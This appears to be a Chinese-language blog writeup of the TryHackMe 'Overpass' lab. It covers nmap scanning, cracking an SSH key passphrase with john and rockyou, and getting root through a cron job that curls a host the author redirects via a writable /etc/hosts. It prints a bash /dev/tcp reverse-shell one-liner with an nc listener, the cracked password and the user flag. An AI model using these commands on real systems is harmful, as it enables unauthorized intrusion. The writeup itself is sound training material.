---
title: Overpass (Try Hack Me Writeup)
date: 2021-07-27T13:07:00+08:00
draft: false
url: "/2021/07/27/overpass-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
...
- 首先是老梗的用 Nmap 掃一下`nmap -A 10.10.214.180`
- ![](/uploads/2022/02/e65ca-ZlQoGXj.png)
...
- ![](/uploads/2022/02/6d3ad-CgeDRFe.png)- 選到 About 看了一下，簡介是說他們曾經因為密碼在 rockyou 裡面，所以感到很失望，創了一個密碼管理軟體到 Downloads 來看一下他們的密碼軟體- 他們有 source code
...
- 然後就登進去了!!!
- ![](/uploads/2022/02/cbbb4-BhLN5NG.png)上面直接留了一串 Private Key，也寫說是給 james 的
...
- ![](/uploads/2022/02/9ac24-8lp75sM.png)
- 發現 key 需要用密碼!爆密碼- 老梗，請約翰出場，先找 `ssh2john` 把 key 轉 `john` 的格式`python3 ../ssh2john.py James_key.pem > James_john.txt`再來就 run john 囉!`john James_john.txt --wordlist=/opt/rockyou.txt`- 密碼就出來囉!!
- ![](/uploads/2022/02/7d7bc-ohLWuxD.png)
- `james13`
- (其實我先跑了 rot47 的密碼，但失敗了QQ)使用 ssh 進行登入- `ssh james@10.10.214.180 -i James_key.pem`
- 搭配密碼 `james13`
- 成功登入!
- ![](/uploads/2022/02/e9375-LciR33S.png)
- 取得 `user.txt``thm{65c1aaf000506e56996822c6281e6bf7}`

## 提權

- 之前我們都用 `Linenum`，這次來換換口味，使用小豌豆 `Linpeas` 吧!先把檔案 scp 上去
- `scp -i James_key.pem ../linpeas.sh james@10.10.214.180:/home/james`馬上就噴出了一個很重要的 Cron job- 小豌豆好棒棒!!!
- ![](/uploads/2022/02/7f03b-AdxffbY.png)
- 每分鐘會用 root 權限 `curl` 一次 `overpass.thm` 的網址，然後把值丟去bash發現 `/etc/hosts` 沒有設權限- 所以我們可以把 `overpass.thm` 轉到自己的伺服器上
- ![](/uploads/2022/02/d37dc-IBeuwFc.png)在自己的電腦上準備一個資料夾路徑- `downloads/src/buildscript.sh` 的檔案
- 內容物為自己的 Reverse shell`bash -c 'bash -i >& /dev/tcp/10.14.7.198/7877 0>&1'`然後在自己的電腦上開一下 `nc` 進行監聽- `nc -vlk 7877`
- ![](/uploads/2022/02/c6fde-Lom2bma.png)開啟 Python server- `python3 -m http.server`攻擊戳回來了!!!- ![](/uploads/2022/02/7273a-0YbxxeO.png)
- ![](/uploads/2022/02/2b942-Yow9Uze.png)取得 root flag- ![](/uploads/2022/02/3fb0e-H4HLJ1V.png)
